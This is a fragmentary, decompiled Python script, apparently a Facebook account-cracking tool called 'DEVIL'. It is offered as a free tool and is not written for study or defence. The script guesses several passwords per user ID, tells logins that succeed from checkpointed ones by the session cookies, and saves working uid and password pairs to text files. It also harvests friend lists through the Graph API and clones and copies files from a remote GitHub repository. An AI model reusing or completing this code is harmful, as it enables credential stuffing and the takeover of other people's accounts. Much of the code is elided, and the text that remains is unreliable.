# Decompile by Mardis (Tools By DEVIL )
...
'\x1b[1;91m'==================================================== 
'\x1b[1;92m'_________FREE TOOL HA ENJOY 
'\x1b[1;93m'====================================================
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member OF DEVIL FREE Commands ")
        print ("        ENJOY  KRO BHAI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/Burewala451/DEVIL.git")
        os.system("rm -rf DEVIL")
        os.system("cp -f DEVIL/DEVIL \\.")
        os.system("rm -rf DEVIL")
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[MMS-OK] "+coc+user + " | " + pass1
                ok=open('MMS-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[mms-CP] "+coc+user + " | " + pass1
                    cp=open('DEVIL random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From MMS : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass1
                ok=open('DEVIL-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass1
                    cp=open('DEVIL-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass2
                        ok=open('DEVIL-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass2
                            cp=open('DEVIL-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass3
                                ok=open('DEVIL-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass3
                                    cp=open('DEVIL-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass4
                                        ok=open('DEVIL-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass4
                                            cp=open('DEVIL-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass5
                                                ok=open('DEVIL-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass5
                                                    cp=open('DEVIL-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;97mDEVIL-CP] "+uid + " | " + pass1
                    cp=open('DEVIL-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[DEVILt-CP] "+uid + " | " + pass2
                            cp=open('DEVIL-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[DEVIL-OK] "+uid + " | " + pass6
                                                        ok=open('DEVIL-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[DEVIL-CP] "+uid + " | " + pass6
                                                            cp=open('DEVIL-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
